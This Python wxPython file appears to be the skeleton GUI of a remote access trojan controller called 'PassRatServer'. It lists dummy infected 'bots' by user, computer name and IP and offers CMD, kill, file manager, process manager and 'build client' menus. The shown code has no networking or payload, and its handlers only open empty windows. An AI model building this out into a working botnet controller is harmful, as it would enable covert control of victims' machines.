# /usr/bin/env python
# coding=utf-8

import wx
import wx.lib.mixins.listctrl  as  listmix

botlist = ['0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   '0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   '0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   '0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   '0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   '0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   '0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   '0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2',
		   '0024-85456646:Windows7:Alex:Alex-PC:192.168.1.2'
		   ]
Header = ['ID', 'SysVersion', 'UserName', 'ComputerName', 'IP']

Server = "10.0.0.1"
port = 9999
botnums = "1007"

class MyListCtrl(wx.ListCtrl, listmix.ListCtrlAutoWidthMixin):
	def __init__(self, parent, ID, pos=wx.DefaultPosition,
				 size=wx.DefaultSize, style=0):
		wx.ListCtrl.__init__(self, parent, ID, pos, size, style)
		listmix.ListCtrlAutoWidthMixin.__init__(self)
		#self.setResizeColumn(5)


class MainFrame(wx.Frame):
	def __init__(self, parent, title):
		wx.Frame.__init__(self, parent, id=wx.ID_ANY, title=title, pos=wx.DefaultPosition,
						  size=wx.Size(-1, -1), style=wx.DEFAULT_FRAME_STYLE | wx.TAB_TRAVERSAL)

		self.InitUI()
		self.Centre()

	def InitUI(self):
		self.MainBox = wx.BoxSizer(wx.VERTICAL)
		self.SetSizer(self.MainBox)
		self.Layout()
		self.Fit()
		self.SetMinSize(wx.Size(900, 500))
		self.CreatMenuBar()
		self.CreatToolbar()
		self.CreatStatusBar()
		self.CreatBotList()

	def CreatBotList(self):
		BotList = MyListCtrl(self, wx.ID_ANY, wx.DefaultPosition, wx.Size(-1, -1),
								   wx.LC_HRULES | wx.LC_REPORT | wx.LC_VRULES)
		#self.BotList.SetMinSize(wx.Size(900, 400))
		BotList.SetAutoLayout(True)
		for index,text in enumerate(Header):
			BotList.InsertColumn(index, text, format=wx.LIST_FORMAT_CENTRE, width=-1)
		for index,text in enumerate(botlist):
			row = BotList.InsertStringItem(index, label = "")
			bot = text.split(":")
			BotList.SetStringItem(row, 0, bot[0])
			BotList.SetStringItem(row, 1, bot[1])
			BotList.SetStringItem(row, 2, bot[2])
			BotList.SetStringItem(row, 3, bot[3])
			BotList.SetStringItem(row, 4, bot[4])
		# set the width of the columns in various ways
		BotList.SetColumnWidth(0, 190)
		BotList.SetColumnWidth(1, 180)
		BotList.SetColumnWidth(2, 170)
		BotList.SetColumnWidth(3, 170)
		BotList.SetColumnWidth(4, 170)
		self.Bind(wx.EVT_CONTEXT_MENU, self.OnShowPopup)
		self.Bind(wx.EVT_LIST_ITEM_SELECTED,self.OnSelect)
		self.MainBox.Add(BotList,1,wx.ALIGN_CENTER_HORIZONTAL|wx.EXPAND,0)
		self.Uid=0
	# self.Bind(wx.EVT_LIST_COL_RIGHT_CLICK,self.OnShowPopup)

	def OnShowPopup(self, event):
		if self.Uid:
			self.popupmenu = wx.Menu()

			Cmditem = wx.MenuItem(self.popupmenu, -1, u"CMD")
			Cmditem.SetBitmap(wx.Bitmap(u"./source/menu/cmd.ico", wx.BITMAP_TYPE_ICO))
			self.popupmenu.AppendItem(Cmditem)

			Killitem =wx.MenuItem(self.popupmenu, -1,u"Kill")
			Killitem.SetBitmap(wx.Bitmap(u"./source/menu/kill.ico", wx.BITMAP_TYPE_ICO))
			self.popupmenu.AppendItem(Killitem)

			Fileitem = wx.MenuItem(self.popupmenu,-1,u"File Manager")
			Fileitem.SetBitmap(wx.Bitmap(u"./source/menu/file.ico", wx.BITMAP_TYPE_ICO))
			self.popupmenu.AppendItem(Fileitem)

			Proceitem = wx.MenuItem(self.popupmenu,-1,u'Process Manager')
			Proceitem.SetBitmap(wx.Bitmap(u"./source/menu/process.ico", wx.BITMAP_TYPE_ICO))
			self.popupmenu.AppendItem(Proceitem)

			self.Bind(wx.EVT_MENU, self.OnCmd, Cmditem)
			self.Bind(wx.EVT_MENU, self.OnKill, Killitem)
			self.Bind(wx.EVT_MENU, self.OnFileManager, Fileitem)
			self.Bind(wx.EVT_MENU, self.OnProcess, Proceitem)
			pos = event.GetPosition()
			pos = self.ScreenToClient(pos)
			self.PopupMenu(self.popupmenu, pos)
			self.Uid=0

	def OnSelect(self,event):
		self.SelItem = event.GetItem()
		self.Uid =self.SelItem.GetText()

	def OnCmd(self, event):
		if self.Uid:
			Cmd = wx.Frame(self, id=-1, title="CMD", pos=wx.DefaultPosition, size=(800, 600),
						   style=wx.DEFAULT_FRAME_STYLE | wx.TAB_TRAVERSAL|wx.TE_READONLY)
			Cmd.Show(True)
			Cmd.SetMinSize(wx.Size(800, 600))
			Cmd.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_3DLIGHT ) )
			Cmd.Centre()
			vbox = wx.BoxSizer(wx.VERTICAL)
			Cmd.SetSizer(vbox)
			self.multiText = wx.TextCtrl(Cmd, -1, "",wx.DefaultPosition, wx.DefaultSize, style=wx.TE_MULTILINE)
			self.multiText.SetMinSize(wx.Size(800, 480))
			self.multiText.SetForegroundColour(wx.Colour(255, 255, 255))
			self.multiText.SetBackgroundColour(wx.Colour(0, 0, 0))

			vbox.Add(self.multiText,0,wx.ALL|wx.EXPAND,0)
			self.CmdInput = wx.TextCtrl(Cmd, -1,style=wx.TE_MULTILINE)
			self.CmdInput.SetMinSize(wx.Size(790, 50))
			vbox.Add(self.CmdInput, 1, wx.ALL|wx.EXPAND , 5)
			CmdButton = wx.Button(Cmd,-1,"Send")
			CmdButton.SetDefault()
			vbox.Add(CmdButton, 0, wx.ALIGN_RIGHT|wx.ALL|wx.ALIGN_BOTTOM, 5)
			Cmd.Fit()
			self.Bind(wx.EVT_BUTTON, self.OnSendCmd, CmdButton)

	def OnSendCmd(self,event):
		Command = self.CmdInput.GetValue()
		self.CmdInput.Clear()
		self.multiText.AppendText(Command+"\n")

	def OnKill(self,event):
		if self.Uid:
			wx.MessageBox(str(self.Uid))

	def OnFileManager(self,event):
		if self.Uid:
			FileFrame = wx.Frame(self)
			FileFrame.Show(True)
			FileFrame.Centre()

	def OnProcess(self,event):
		if self.Uid:
			ProFrame = wx.Frame(self)
			ProFrame.Show(True)
			ProFrame.Centre()


	def CreatStatusBar(self):
		StatusBar = self.CreateStatusBar(1, wx.ST_SIZEGRIP, wx.ID_ANY)
		StatusBar.SetFieldsCount(2)
		StatusBar.SetStatusText("Server: %s:%s" % (Server, str(port)), 0)
		StatusBar.SetStatusText("BotNumbers: %s" % botnums, 1)

	def CreatMenuBar(self):
		MyMenuBar = wx.MenuBar(0)

		FileMenu = wx.Menu()
		ServerItem = wx.MenuItem(FileMenu, wx.ID_ANY, u"Server", wx.EmptyString, wx.ITEM_NORMAL)
		FileMenu.AppendItem(ServerItem)
		ExitMenuItem = wx.MenuItem(FileMenu, wx.ID_ANY, u"Exit", wx.EmptyString, wx.ITEM_NORMAL)
		FileMenu.AppendItem(ExitMenuItem)
		MyMenuBar.Append(FileMenu, u" Start")

		OptionMenu = wx.Menu()
		BuildClientItem = wx.MenuItem(OptionMenu, wx.ID_ANY, u"Build client", wx.EmptyString, wx.ITEM_NORMAL)
		OptionMenu.AppendItem(BuildClientItem)
		MyMenuBar.Append(OptionMenu, u"Options")

		HelpMenu = wx.Menu()
		AboutMenuItem = wx.MenuItem(HelpMenu, wx.ID_ANY, u"About", wx.EmptyString, wx.ITEM_NORMAL)
		HelpMenu.AppendItem(AboutMenuItem)
		MyMenuBar.Append(HelpMenu, u"Help")

		self.SetMenuBar(MyMenuBar)
		self.Bind(wx.EVT_MENU, self.OnExit, ExitMenuItem)
		self.Bind(wx.EVT_MENU, self.OnAbout, AboutMenuItem)
		self.Bind(wx.EVT_MENU, self.OnBuildClient,BuildClientItem)
		self.Bind(wx.EVT_MENU, self.OnServer,ServerItem)

	def CreatToolbar(self):
		ToolBar = wx.ToolBar(self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize,
									 wx.TB_HORIZONTAL | wx.TB_TEXT)
		SerIterm=ToolBar.AddLabelTool(wx.ID_ANY, u"Server",
													wx.Bitmap(u"./source/toolbar/option.ico", wx.BITMAP_TYPE_ANY), wx.NullBitmap,
													wx.ITEM_NORMAL, u"Server Options", u"Server Options", None)
		ToolBar.AddSeparator()
		CliIterm =ToolBar.AddLabelTool(wx.ID_ANY, u"Client",
													wx.Bitmap(u"./source/toolbar/client.ico", wx.BITMAP_TYPE_ANY), wx.NullBitmap,
													wx.ITEM_NORMAL, u"Build client", u"Build client", None)
		ToolBar.AddSeparator()
		RefItem =ToolBar.AddLabelTool(wx.ID_ANY, u"Refresh",
													wx.Bitmap(u"./source/toolbar/refresh.ico", wx.BITMAP_TYPE_ANY), wx.NullBitmap,
													wx.ITEM_NORMAL, u"Refresh", u"Refresh", None)
		ToolBar.Realize()
		self.MainBox.Add(ToolBar,0,wx.ALL|wx.EXPAND,0)

		self.Bind(wx.EVT_MENU ,self.OnServer,SerIterm)
		self.Bind(wx.EVT_MENU, self.OnBuildClient, CliIterm)
		self.Bind(wx.EVT_MENU, self.OnRefresh, RefItem)

	def OnExit(self, event):
		self.Close()

	def OnAbout(self, event):
		wx.MessageBox(u"Powered by xxx\n2016/07/15")
	def OnServer(self,event):
		ServerFrame = wx.Frame(self,id=wx.ID_ANY, title="Server Option", pos=(400,400),
						  size=wx.Size(432, 252), style=wx.DEFAULT_FRAME_STYLE | wx.TAB_TRAVERSAL)
		ServerFrame.Show(True)
		ServerFrame.SetMinSize(wx.Size(432, 252))
		panel = wx.Panel(ServerFrame)
		panel.SetMinSize(wx.Size(432, 252))
		vbox = wx.BoxSizer(wx.VERTICAL)
		nm = wx.StaticBox(panel, -1, 'Listen IP:')
		nmSizer = wx.StaticBoxSizer(nm, wx.VERTICAL)

		nmbox = wx.BoxSizer(wx.HORIZONTAL)
		fn = wx.StaticText(panel, -1, "Listen IP:")

		nmbox.Add(fn, 0, wx.ALL | wx.CENTER, 5)
		nm1 = wx.TextCtrl(panel, -1, style=wx.ALIGN_LEFT)
		nm2 = wx.TextCtrl(panel, -1, style=wx.ALIGN_LEFT)
		ln = wx.StaticText(panel, -1, "Listen Port:")

		nmbox.Add(nm1, 0, wx.ALL | wx.CENTER, 5)
		nmbox.Add(ln, 0, wx.ALL | wx.CENTER, 5)
		nmbox.Add(nm2, 0, wx.ALL | wx.CENTER, 5)
		nmSizer.Add(nmbox, 1, wx.ALL | wx.CENTER, 10)

		sbox = wx.StaticBox(panel, -1, 'Operating')
		sboxSizer = wx.StaticBoxSizer(sbox, wx.VERTICAL)

		hbox = wx.BoxSizer(wx.HORIZONTAL)
		okButton = wx.Button(panel, -1, 'OK')

		hbox.Add(okButton, 0, wx.ALL | wx.LEFT, 10)
		cancelButton = wx.Button(panel, -1, 'Stop')

		hbox.Add(cancelButton, 0, wx.ALL | wx.LEFT, 10)
		sboxSizer.Add(hbox, 0, wx.ALL | wx.LEFT, 10)
		vbox.Add(nmSizer, 1, wx.ALL | wx.CENTER, 5)
		vbox.Add(sboxSizer, 1, wx.ALL | wx.CENTER, 5)
		panel.SetSizer(vbox)
		ServerFrame.Centre()

		panel.Fit()

	def OnBuildClient(self, event):
		BuildFrame = wx.Frame(self,id=wx.ID_ANY, title="Server Option", pos=(-1,-1),
					  size=wx.Size(432, 252), style=wx.DEFAULT_FRAME_STYLE | wx.TAB_TRAVERSAL)
		BuildFrame.Show(True)
		BuildFrame.Centre()
	def OnRefresh(self,event):
		wx.MessageBox("refresh!!!")
	def __del__(self):
		pass


app = wx.App(False)
MainWindow = MainFrame(None, u"PassRatServer")
MainWindow.Show(True)
app.MainLoop()
